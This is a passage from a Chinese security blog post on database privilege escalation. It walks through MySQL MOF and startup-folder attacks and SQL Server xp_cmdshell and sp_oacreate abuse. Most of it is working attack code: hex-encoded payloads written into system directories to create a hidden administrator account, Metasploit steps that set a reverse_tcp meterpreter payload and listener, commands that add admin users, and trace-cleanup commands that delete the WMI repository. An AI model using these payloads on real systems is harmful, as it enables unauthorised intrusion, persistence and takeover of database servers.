<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var WSH = <span class="keyword">new</span> ActiveXObject(\<span class="string">&quot;WScript.Shell\&quot;</span>)\nWSH.run(\<span class="string">&quot;net.exe user hacker passwd@123456 /add\&quot;</span>)\nWSH.run(\<span class="string">&quot;net.exe localgroup administrators hacker /add\&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>MySQL 写文件的特性将这个 MOF 文件导入到 <code>C:/Windows/system32/wbem/mof/</code> 目录下，依然采用上述编码的方式：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A</span> <span class="keyword">into</span> dumpfile &quot;C:/windows/system32/wbem/mof/test.mof&quot;;</span><br></pre></td></tr></table></figure>

<p>执行成功的的时候，<code>test.mof</code> 会出现在：<code>C:/windows/system32/wbem/goog/</code> 目录下 否则出现在 <code>C:/windows/system32/wbem/bad</code>目录下：</p>
<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20201118/16056293813642.png"><img src="https://s2.loli.net/2024/08/06/qJBRcj4V7rb1SMK.png" alt="img"></a></p>
<h5 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h5><p>因为每隔几分钟时间又会重新执行添加用户的命令，所以想要清理痕迹得先暂时关闭 <code>winmgmt</code> 服务再删除相关 mof 文件，这个时候再删除用户才会有效果：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net stop winmgmt <span class="comment"># 停止 winmgmt 服务</span></span><br><span class="line"><span class="built_in">rmdir</span> /s /q C:\Windows\system32\wbem\Repository\ <span class="comment"># 删除 Repository 文件夹</span></span><br><span class="line">del C:\Windows\system32\wbem\mof\good\test.mof /F /S <span class="comment"># 手动删除 mof 文件</span></span><br><span class="line">net user hacker /delete <span class="comment"># 删除创建的用户</span></span><br><span class="line">net start winmgmt <span class="comment"># 重新启动服务</span></span><br></pre></td></tr></table></figure>

<h5 id="2-MSF-MOF-提权"><a href="#2-MSF-MOF-提权" class="headerlink" title="2.MSF MOF 提权"></a>2.MSF MOF 提权</h5><p>MSF 里面也自带了 MOF 提权模块，使用起来也比较方便而且也做到了自动清理痕迹的效果，实际操作起来效率也还不错：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/mysql/mysql_mof</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp <span class="comment"># 设置好自己的 payload</span></span><br><span class="line">msf6 &gt; <span class="built_in">set</span> rhosts 192.168.72.1 <span class="comment"># 设置目标 MySQL 的基础信息</span></span><br><span class="line">msf6 &gt; <span class="built_in">set</span> username root</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> password 123456</span><br><span class="line">msf6 &gt; run</span><br></pre></td></tr></table></figure>

<h4 id="4-启动项提权"><a href="#4-启动项提权" class="headerlink" title="4.启动项提权"></a>4.启动项提权</h4><p>这种提权也常见于 Windows 环境下，当 Windows 的启动项可以被 MySQL 写入的时候可以使用 MySQL 将自定义脚本导入到启动项中，这个脚本会在用户登录、开机、关机的时候自动运行,同时因为是开机自启动，再写入之后，需要重启目标服务器(这个要求mysql的权限就很高，至少是管理员权限，甚至是system)，只能在windows中使用。</p>
<h5 id="1-手工复现-1"><a href="#1-手工复现-1" class="headerlink" title="1.手工复现"></a>1.手工复现</h5><h5 id="1-1启动项路径"><a href="#1-1启动项路径" class="headerlink" title="1.1启动项路径"></a>1.1启动项路径</h5><p><strong>Windows Server 2003</strong> 的启动项路径：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 中文系统</span></span><br><span class="line">C:\Documents and Settings\Administrator\「开始」菜单\程序\启动</span><br><span class="line">C:\Documents and Settings\All Users\「开始」菜单\程序\启动</span><br><span class="line"></span><br><span class="line"><span class="comment"># 英文系统</span></span><br><span class="line">C:\Documents and Settings\Administrator\Start Menu\Programs\Startup</span><br><span class="line">C:\Documents and Settings\All Users\Start Menu\Programs\Startup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开关机项 需要自己建立对应文件夹</span></span><br><span class="line">C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Startup</span><br><span class="line">C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Shutdown</span><br></pre></td></tr></table></figure>

<p><strong>Windows Server 2008</strong> 的启动项路径：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup   <span class="comment">#windows10路径</span></span><br></pre></td></tr></table></figure>

<p>既然知道路径的话就往启动项路径里面写入脚本吧，脚本支持 vbs 和 exe 类型，可以利用 vbs 执行一些 CMD 命令，也可以使用 exe 上线 MSF 或者 CS 这方面还是比较灵活的。下面是一个执行基础命令的 VB 脚本：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span> WshShell=WScript.CreateObject(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">WshShell.Run <span class="string">&quot;net user hacker P@ssw0rd /add&quot;</span>, <span class="number">0</span></span><br><span class="line">WshShell.Run <span class="string">&quot;net localgroup administrators hacker /add&quot;</span>, <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h5 id="1-2MySQL-写入启动项"><a href="#1-2MySQL-写入启动项" class="headerlink" title="1.2MySQL 写入启动项"></a>1.2MySQL 写入启动项</h5><p>将上述 vbs 或者 CS 的马转十六进制直接写如到系统启动项中：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">0x536574205773685368656C6C3D575363726970742E4372656174654F626A6563742822575363726970742E5368656C6C22290A5773685368656C6C2E52756E20226E65742075736572206861636B6572205040737377307264202F616464222C20300A5773685368656C6C2E52756E20226E6574206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F616464222C20300A</span> <span class="keyword">into</span> dumpfile &quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.vbs&quot;;</span><br></pre></td></tr></table></figure>

<p>写入成功的时候就等待系统用户重新登录，登录成功的话，我们的自定义脚本也就会被执行。</p>
<h5 id="2-MSF启动项提权"><a href="#2-MSF启动项提权" class="headerlink" title="2.MSF启动项提权"></a>2.MSF启动项提权</h5><p>MSF 封装好了对应的模块，目标系统为 Windows 的情况下可以直接使用该模块来上线 MSF，使用起来也很简单：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/mysql/mysql_start_up</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置 MySQL 连接信息</span></span><br><span class="line">msf6 &gt; <span class="built_in">set</span> rhosts 192.168.72.1</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> username root</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> password root</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> STARTUP_FOLDER /programdata/microsoft/windows/start menu/programs/startup/</span><br><span class="line">msf6 &gt; run</span><br></pre></td></tr></table></figure>

<p><code>STARTUP_FOLDER 启动项文件夹得自己根据实际的目标系统来进行调整</code></p>
<p>MSF 会写入 exe 木马到启动项中，执行完成后开启监听会话(默认端口为4444)：</p>
<p><img src="C:\Users\86134\AppData\Roaming\Typora\typora-user-images\image-20240807170437454.png" alt="image-20240807170437454"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; handler -H 10.20.24.244 -P 4444 -p windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>

<p>当目标系统重新登录的时候，MSF 这里可以看到已经成功上线了：</p>
<p><img src="C:\Users\86134\AppData\Roaming\Typora\typora-user-images\image-20240807171308595.png" alt="image-20240807171308595"></p>
<p>在靶机使用<code>netstat</code>可以看到外联情况</p>
<p><img src="C:\Users\86134\AppData\Roaming\Typora\typora-user-images\image-20240807171743866.png" alt="image-20240807171743866"></p>
<h1 id="SqlServer数据库提权"><a href="#SqlServer数据库提权" class="headerlink" title="SqlServer数据库提权"></a>SqlServer数据库提权</h1><h2 id="一-前置条件"><a href="#一-前置条件" class="headerlink" title="一.前置条件"></a>一.前置条件</h2><ol>
<li>开启了远程连接</li>
<li>已经获得syadmin级别(sa)数据库用户权限</li>
<li>sqlServer启动用户为Administrators组成员</li>
</ol>
<h2 id="二-权限提升-1"><a href="#二-权限提升-1" class="headerlink" title="二.权限提升"></a>二.权限提升</h2><h3 id="1-xp-cmdshell提权"><a href="#1-xp-cmdshell提权" class="headerlink" title="1.xp_cmdshell提权"></a>1.xp_cmdshell提权</h3><ol>
<li><p><code>sqlserver2005</code>以前</p>
<ul>
<li><p>早期<code>xp_cmdshell</code>没有被默认禁用,直接就可以执行命令,创建用户<code>newadmin</code>,并加入<code>administrators</code>用户组</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> xp_cmdshell <span class="string">&#x27;net user newadmin aaa /add &amp;&amp; net localgroup administrators newadmin /add&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>sqlserver2005</code>以后		</p>
<ul>
<li><p>检查判断<code>xp_cmdshell</code>是否存在</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>)<span class="keyword">from</span> master.dbo.sysobjects <span class="keyword">where</span> xtype <span class="operator">=</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> name <span class="operator">=</span> <span class="string">&#x27;xp_cmdshell&#x27;</span> ;</span><br><span class="line">#返回<span class="number">1</span>是存在的，返回<span class="number">0</span>则需要通过xplog70.dll恢复。</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用<code>sp_configure</code>开启<code>xp_cmdshell</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span> ;</span><br><span class="line">Reconfigure;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span> ; #开启xp_cmdshell，如果关闭，需要将这里的<span class="number">1</span>改为&quot;0&quot;</span><br><span class="line">Reconfigure; #以上命令开启用xp_cmdshell</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="2-sp-oa系列存储过程提权"><a href="#2-sp-oa系列存储过程提权" class="headerlink" title="2.sp_oa系列存储过程提权"></a>2.sp_oa系列存储过程提权</h3><ul>
<li><code>sp_oacreate</code>和<code>sp_oamethod</code>提权</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="variable">@cmd</span> <span class="type">INT</span>;</span><br><span class="line"><span class="keyword">exec</span> sp_oacreate <span class="string">&#x27;wscript.shell&#x27;</span>,<span class="variable">@cmd</span> output;</span><br><span class="line"><span class="keyword">exec</span> sp_oamethod <span class="variable">@cmd</span>,<span class="string">&#x27;run&#x27;</span>,<span class="keyword">null</span>,<span class="string">&#x27;net user hack hack /add&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;true&#x27;</span>;</span><br><span class="line"><span class="keyword">exec</span> sp_oacreate <span class="string">&#x27;wscript.shell&#x27;</span>,<span class="variable">@cmd</span> output;</span><br><span class="line"><span class="keyword">exec</span> sp_oamethod <span class="variable">@cmd</span>,<span class="string">&#x27;run&#x27;</span>,<span class="keyword">null</span>,<span class="string">&#x27;net localgroup administrators hack /add&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;true&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>以上语句也是在sql一起执行，语句中间没有空格，但是执行可能会遇到问题:</p>
<ul>
<li>我们需要开启存储过程：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;Ole Automation Procedures&#x27;</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>以上语句也是在sql一起执行，语句中间没有空格，如果存储过程删除的话需要利用odsole70.dll恢复存储过程再执行。</p>
<p>这样我们执行上面的语句之后就会创建一个hack的账户，并加到管理员组。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://RuiJiLuo.github.io">Rui Ji</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://ruijiluo.github.io/2024/06/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/">http://ruijiluo.github.io/2024/06/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://RuiJiLuo.github.io" target="_blank">RJ の 博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2024/06/11/65iaHZ8bDsGUlC4.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/08/06/%E5%8F%8D%E5%BC%B9shell/" title="反弹shell"><img class="cover" src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">反弹shell</div></div></a></div><div class="next-post pull-right"><a href="/2024/06/01/javaWeb/" title="常见开源系统漏洞"><img class="cover" src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">常见开源系统漏洞</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/09/07/oZOaspjYrzmT5e9.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Rui Ji</div><div class="author-info__description">私 の hacker 夢</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ruijiluo"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Redis%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="toc-text">Redis数据库提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-Redis%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="toc-text">一.Redis基本介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4"><span class="toc-text">1.常见命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%8B%93%E5%B1%95%E5%91%BD%E4%BB%A4"><span class="toc-text">2.拓展命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Redis%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C"><span class="toc-text">3.Redis基本操作</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81%E8%BF%9E%E6%8E%A5Redis%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-text">1、连接Redis服务器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81Redis%E8%AE%BE%E7%BD%AE%E5%AF%86%E7%A0%81"><span class="toc-text">2、Redis设置密码</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E5%8F%8A%E9%85%8D%E7%BD%AE"><span class="toc-text">二.软件安装及配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Redis-3-2-0%E5%AE%89%E8%A3%85"><span class="toc-text">1.Redis-3.2.0安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Redis-4-0-8%E5%AE%89%E8%A3%85"><span class="toc-text">2.Redis-4.0.8安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E9%87%8D%E8%A6%81%E9%85%8D%E7%BD%AE%E5%92%8C%E6%96%87%E4%BB%B6"><span class="toc-text">3.重要配置和文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BAredis"><span class="toc-text">4.启动靶机redis</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">三.漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">1.redis未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">1.漏洞原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">2.漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5webshell"><span class="toc-text">2.redis未授权写入webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="toc-text">1.漏洞原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="toc-text">2.漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95ssh"><span class="toc-text">3.redis未授权密钥登录ssh</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2"><span class="toc-text">1.漏洞原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-2"><span class="toc-text">2.漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%A9%E7%94%A8%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">4.redis未授权利用计划任务反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-3"><span class="toc-text">1.漏洞原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-3"><span class="toc-text">2.漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE"><span class="toc-text">5.主从复制RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-4"><span class="toc-text">1.漏洞原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-4"><span class="toc-text">2.漏洞利用</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="toc-text">MySql数据库提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E6%9D%83%E9%99%90%E8%8E%B7%E5%8F%96"><span class="toc-text">一.权限获取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E6%9D%83%E9%99%90"><span class="toc-text">1.获取数据库操作权限</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-Mysql-3306%E7%AB%AF%E5%8F%A3%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4"><span class="toc-text">1.Mysql 3306端口弱口令爆破</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E7%BD%91%E7%AB%99%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E6%B3%84%E9%9C%B2%E6%8B%BF%E5%88%B0%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF"><span class="toc-text">2.网站的数据库配置泄露拿到密码信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-sqlmap-sql-shell"><span class="toc-text">3.sqlmap --sql-shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E9%80%9A%E8%BF%87sql%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%86%E7%A0%81hash"><span class="toc-text">4.通过sql注入获取数据库密码hash</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E%E7%9B%B4%E6%8E%A5%E6%8B%BF%E4%B8%8B-MySQL-%E6%9D%83%E9%99%90"><span class="toc-text">5.通用漏洞直接拿下 MySQL 权限</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-text">二.权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-webshell%E6%8F%90%E6%9D%83"><span class="toc-text">1.webshell提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-into-oufile-%E5%86%99-shell"><span class="toc-text">1.into oufile 写 shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6-%E5%86%99-shell"><span class="toc-text">2.日志文件 写 shell</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-UDF%E6%8F%90%E6%9D%83"><span class="toc-text">2.UDF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%89%8B%E5%8A%A8%E5%A4%8D%E7%8E%B0"><span class="toc-text">1.手动复现</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97unf%E6%96%87%E4%BB%B6%E7%9A%84%E5%AD%98%E5%82%A8%E8%B7%AF%E5%BE%84"><span class="toc-text">获得unf文件的存储路径</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93"><span class="toc-text">获得动态链接库</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93"><span class="toc-text">写入动态链接库</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%B9%B6%E8%B0%83%E7%94%A8%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0"><span class="toc-text">创建并调用自定义函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0"><span class="toc-text">删除自定义函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-udfshell%E5%B7%A5%E5%85%B7"><span class="toc-text">2.udfshell工具</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-MOF%E6%8F%90%E6%9D%83"><span class="toc-text">3.MOF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%89%8B%E5%B7%A5%E5%A4%8D%E7%8E%B0"><span class="toc-text">1.手工复现</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0-mof-%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">上传 mof 文件执行命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="toc-text">痕迹清理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-MSF-MOF-%E6%8F%90%E6%9D%83"><span class="toc-text">2.MSF MOF 提权</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83"><span 